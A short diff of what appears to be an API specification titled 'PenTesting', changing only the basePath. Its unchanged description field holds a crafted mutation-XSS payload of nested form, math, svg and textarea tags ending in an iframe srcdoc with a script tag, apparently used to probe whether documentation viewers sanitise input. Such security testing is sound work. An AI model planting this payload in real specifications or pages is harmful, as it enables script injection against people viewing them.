@@ -3,7 +3,7 @@ info:
   title: PenTesting
   description: <form><math><mtext></form><form><mglyph><svg><mtext><textarea><desc id="</textarea><math><mtext><!--"><textarea id="--><iframe srcdoc="<script><script src=https://></script>">
   version: production
-basePath: /JSSResource/
+basePath: /JSSResource3/
 produces:
   - application/xml
   - application/json
